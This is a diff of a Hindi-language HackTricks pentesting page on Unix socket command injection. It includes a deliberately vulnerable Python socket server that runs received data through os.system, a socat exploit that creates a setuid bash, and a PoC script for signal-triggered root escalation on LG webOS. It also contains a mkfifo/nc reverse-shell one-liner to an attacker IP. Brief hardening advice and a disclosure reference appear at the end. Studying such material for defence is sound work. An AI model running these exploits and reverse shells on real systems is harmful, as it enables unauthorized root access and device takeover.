@@ -1,8 +1,10 @@
+# Socket Command Injection
+
 {{#include ../../banners/hacktricks-training.md}}
 
-## Python के साथ सॉकेट बाइंडिंग उदाहरण
+## Python के साथ Socket binding का उदाहरण
 
-निम्नलिखित उदाहरण में एक **यूनिक्स सॉकेट बनाया गया है** (`/tmp/socket_test.s`) और जो कुछ भी **प्राप्त** होता है वह `os.system` द्वारा **निष्पादित** किया जाएगा। मुझे पता है कि आप इसे वास्तविक जीवन में नहीं पाएंगे, लेकिन इस उदाहरण का लक्ष्य यह देखना है कि यूनिक्स सॉकेट का उपयोग करने वाला कोड कैसा दिखता है, और सबसे खराब स्थिति में इनपुट को कैसे प्रबंधित किया जाए।
+निम्नलिखित उदाहरण में एक **unix socket बनाया जाता है** (`/tmp/socket_test.s`) और जो कुछ भी **प्राप्त** होगा उसे `os.system` द्वारा **निष्पादित** किया जाएगा। मुझे पता है कि आप इसे वास्तविक दुनिया में शायद नहीं पाएँगे, लेकिन इस उदाहरण का लक्ष्य यह दिखाना है कि unix sockets का उपयोग करने वाला कोड कैसा दिखता है, और सबसे खराब स्थिति में इनपुट को कैसे संभालना है।
 ```python:s.py
 import socket
 import os, os.path
@@ -24,15 +26,50 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**कोड को चलाएँ** python का उपयोग करके: `python s.py` और **जाँच करें कि सॉकेट कैसे सुन रहा है**:
+**कोड चलाएँ** python का उपयोग करके: `python s.py` और **जांचें कि socket कैसे सुन रहा है**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
 unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
 ```
-**शोषण**
+**Exploit**
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
+## केस स्टडी: Root-owned UNIX socket signal-triggered escalation (LG webOS)
+
+कुछ privileged daemons एक root-owned UNIX socket एक्सपोज़ करते हैं जो untrusted input स्वीकार करता है और privileged actions को thread-IDs और signals से जोड़ता है। यदि protocol unprivileged client को यह प्रभावित करने देता है कि कौन सा native thread लक्ष्य बनता है, तो आप privileged code path ट्रिगर करके escalate कर सकते हैं।
+
+प्रेक्षित पैटर्न:
+- Root-owned socket से कनेक्ट करें (उदा., /tmp/remotelogger).
+- एक thread बनाएँ और उसके native thread id (TID) प्राप्त करें।
+- TID (packed) और padding एक request के रूप में भेजें; acknowledgement प्राप्त करें।
+- उस TID को एक specific signal भेजें ताकि privileged behaviour ट्रिगर हो।
+
+न्यूनतम PoC खाका:
+```python
+import socket, struct, os, threading, time
+# Spawn a thread so we have a TID we can signal
+th = threading.Thread(target=time.sleep, args=(600,)); th.start()
+tid = th.native_id  # Python >=3.8
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/tmp/remotelogger")
+s.sendall(struct.pack('<L', tid) + b'A'*0x80)
+s.recv(4)  # sync
+os.kill(tid, 4)  # deliver SIGILL (example from the case)
+```
+इसे root shell में बदलने के लिए, एक सरल named-pipe + nc pattern का उपयोग किया जा सकता है:
+```bash
+rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
+```
+नोट:
+- यह बग वर्ग उन मानों पर भरोसा करने से उत्पन्न होता है जो गैर-प्रिविलेज्ड क्लाइंट स्टेट (TIDs) से निकले होते हैं और उन्हें प्रिविलेज्ड सिग्नल हैंडलरों या लॉजिक से बाइंड कर दिया जाता है।
+- मजबूत करने के लिए: socket पर credentials लागू करें, message formats को validate करें, और प्रिविलेज्ड ऑपरेशन्स को बाहरी रूप से प्रदान किए गए thread identifiers से अलग करें।
+
+## संदर्भ
+
+- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
+
 {{#include ../../banners/hacktricks-training.md}}
